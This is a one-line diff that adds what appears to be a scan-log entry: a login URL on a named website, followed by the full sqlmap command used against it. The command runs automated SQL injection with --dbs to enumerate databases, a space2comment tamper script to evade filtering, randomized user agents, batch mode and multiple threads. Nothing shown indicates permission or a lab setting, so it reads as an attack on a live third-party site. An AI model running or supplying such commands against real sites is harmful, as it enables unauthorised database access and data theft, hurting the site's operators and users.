@@ -1,0 +1,1 @@
+https://regisono.com/login.php?id=1 (GET)  # C:\Users\aboul\AppData\Local\Programs\Python\Python313\Scripts\sqlmap -u https://regisono.com/login.php?id=1 --batch --random-agent --level 2 --risk 2 --tamper=space2comment --output-dir sqlmap_results_2025-03-07_16-24-59 --flush-session --dbs --timeout=10 --threads=5 --smart --time-sec=5
